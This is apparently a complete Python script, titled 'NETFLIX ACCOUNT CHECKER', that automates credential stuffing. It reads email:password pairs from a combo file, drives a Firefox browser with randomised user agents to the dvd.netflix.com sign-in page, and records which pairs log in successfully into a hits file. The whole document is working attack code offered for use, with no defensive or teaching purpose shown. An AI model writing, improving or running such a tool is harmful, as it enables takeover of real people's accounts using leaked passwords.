from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from colorama import Style, Fore, init
from os import name, system
from fake_useragent import UserAgent


class Netflix():

    def Clear(self):
        if name == 'posix':
            # FOR LINUX
            system('clear')
        elif name == 'nt':
            # FOR WINDOWS
            system('cls')
        else:
            print("\n") * 120

    def __init__(self):
        self.SetTitle()
        self.hits = self.bads = self.retries = self.threads = 0
        self.Clear()
        init(convert=True)

    def SetTitle(self):
        system("title [NETFLIX ACCOUNT CHECKER]")

    def UpdateTitle(self):
        system(f"title [NETFLIX ACCOUNT CHECKER] ^| HITS {self.hits} ^| BADS {self.bads} ^| RETRIES {self.retries} ^| THREADS {self.threads}")

    def ReadFile(self, fname):
        with open(fname, "r") as f:
            return f.readlines();

    def ResultProcessor(self, status, email, pwd, bot):
        if status == "BAD":
            print(Style.BRIGHT + Fore.RED + "[ BAD ] " + email + ":" + pwd, end='', flush=True)
            self.bads += 1
            with open("Results/bads.txt", "a") as f:
                f.write(email + ":" + pwd)
        elif status == "RETRY":
            print(Style.BRIGHT + Fore.YELLOW + "[ RETRY ] " + email + ":" + pwd, end='', flush=True)
            self.retries += 1
            with open("Results/retries.txt", "a") as f:
                f.write(email + ":" + pwd)
        elif status == "HIT":
            print(Style.BRIGHT + Fore.GREEN + "[ HIT ] " + email + ":" + pwd, end='', flush=True)
            self.hits += 1
            with open("Results/hits.txt", "a") as f:
                f.write(email + ":" + pwd)
        self.UpdateTitle()

    def Login(self, email, pwd):
        profile = webdriver.FirefoxProfile()
        profile.set_preference("general.useragent.override", UserAgent().random)
        bot = webdriver.Firefox(firefox_profile=profile)

        bot.get('https://dvd.netflix.com/SignIn')

        try:
            WebDriverWait(bot, 3).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="email"]'))).send_keys(email)
            try:
                WebDriverWait(bot, 3).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="password"]'))).send_keys(pwd)
                try:
                    WebDriverWait(bot, 3).until(EC.element_to_be_clickable((By.XPATH, '//*[@id="signin"]/button'))).click()
                    try:
                        WebDriverWait(bot, 5).until_not(EC.title_contains('Sign In'))
                        self.ResultProcessor("HIT", email, pwd, bot)
                        bot.quit()
                    except:
                        self.ResultProcessor("BAD", email, pwd, bot)
                        bot.quit()
                except:
                    self.ResultProcessor("RETRY", email, pwd, bot)
                    bot.quit()
            except:
                self.ResultProcessor("RETRY", email, pwd, bot)
                bot.quit()
        except:
            self.ResultProcessor("RETRY", email, pwd, bot)
            bot.quit()

    def Start(self):
        combos = self.ReadFile("Data/combo.txt")
        for combo in combos:
            if combo == "\n":
                continue
            email = combo.split(':')[0]
            pwd = combo.split(':')[-1]
            self.Login(email, pwd)

nfx = Netflix()
nfx.Start()
sleep(30)